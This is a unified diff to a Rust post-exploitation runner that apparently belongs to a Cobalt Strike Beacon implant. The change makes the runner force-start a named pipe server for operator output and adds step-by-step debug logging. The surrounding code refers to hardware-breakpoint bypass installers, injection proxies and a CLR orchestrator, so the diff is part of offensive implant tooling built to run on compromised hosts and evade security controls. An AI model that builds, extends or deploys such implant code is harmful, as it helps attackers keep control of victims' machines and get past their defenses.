@@ -148,40 +148,52 @@ unsafe fn run_postex(h_module: HMODULE, lp_reserved: *mut c_void, start_named_pi
         }
 
         // 3. Start the named pipe server BEFORE anything else can call
-        //    BeaconAPI. Operator-side `bread_pipe` connects to this pipe;
-        //    smartinject proxies write to it; our streamer writes to it.
-        //    If this fails we still try to run — orchestrator output gets
-        //    lost but a hard exit is worse.
-        debug_log::log_hex(b"[runner] step 3: startNamedPipe=", start_named_pipe as u32);
-        if start_named_pipe {
-            debug_log::log(b"[runner]   calling start_named_pipe_server");
-            let ok = pipes::start_named_pipe_server();
-            debug_log::log_hex(b"[runner]   start_named_pipe_server returned=", ok as u32);
+        //    BeaconAPI. Diagnostic v0.3.4: log gPipeName regardless of the
+        //    startNamedPipe flag (so we see whether CS patched the
+        //    placeholder), THEN force-create the pipe unconditionally —
+        //    CS's startNamedPipe=0 in the diag run suggests the flag is
+        //    not what controls pipe-server lifecycle in modern CS.
+        debug_log::log_hex(b"[runner] step 3: startNamedPipe arg=", start_named_pipe as u32);
+        {
+            let name_ptr = core::ptr::addr_of!(pipes::gPipeName) as *const u8;
+            debug_log::log(b"[runner]   gPipeName first 64 bytes:");
+            debug_log::log(core::slice::from_raw_parts(name_ptr, 64));
         }
+        debug_log::log(b"[runner]   force-calling start_named_pipe_server (ignoring arg flag)");
+        let ok = pipes::start_named_pipe_server();
+        debug_log::log_hex(b"[runner]   start_named_pipe_server returned=", ok as u32);
+        // Remember whether we started it so postex_exit knows to tear down.
+        let started_pipe = ok;
 
         // 4. Parse orchestrator args from the user-arg buffer.
+        debug_log::log(b"[runner] step 4: args parse");
         let parsed = match args::parse(user_args_ptr, user_args_size as usize) {
             Ok(a) => a,
             Err(_e) => {
+                debug_log::log(b"[runner]   args parse FAILED");
                 beacon_api::output(
                     beacon_api::CALLBACK_ERROR,
                     b"[runner] args parse failed\n",
                 );
-                postex::postex_exit(start_named_pipe, pa.exit_func);
+                postex::postex_exit(started_pipe, pa.exit_func);
             }
         };
+        debug_log::log(b"[runner]   args parse ok");
 
         // 5. Initialise HWBP engine for the orchestrator's bypass installers.
+        debug_log::log(b"[runner] step 5: HwbpEngine::init");
         let engine = match opsec_hwbp::HwbpEngine::init() {
             Ok(e) => e,
             Err(_) => {
+                debug_log::log(b"[runner]   HwbpEngine::init FAILED");
                 beacon_api::output(
                     beacon_api::CALLBACK_ERROR,
                     b"[runner] hwbp init failed\n",
                 );
-                postex::postex_exit(start_named_pipe, pa.exit_func);
+                postex::postex_exit(started_pipe, pa.exit_func);
             }
         };
+        debug_log::log(b"[runner]   HwbpEngine::init ok");
 
         // 6. Build the orchestrator input.
         let input = clr_orchestrator::OrchestrateInput {
@@ -229,8 +241,9 @@ unsafe fn run_postex(h_module: HMODULE, lp_reserved: *mut c_void, start_named_pi
             }
         }
 
-        // 9. Exit per PostexArguments::ExitFunc.
-        postex::postex_exit(start_named_pipe, pa.exit_func);
+        // 9. Exit per PostexArguments::ExitFunc. Use our local `started_pipe`
+        //    boolean since we ignored the startNamedPipe argument flag.
+        postex::postex_exit(started_pipe, pa.exit_func);
     }
 }
 
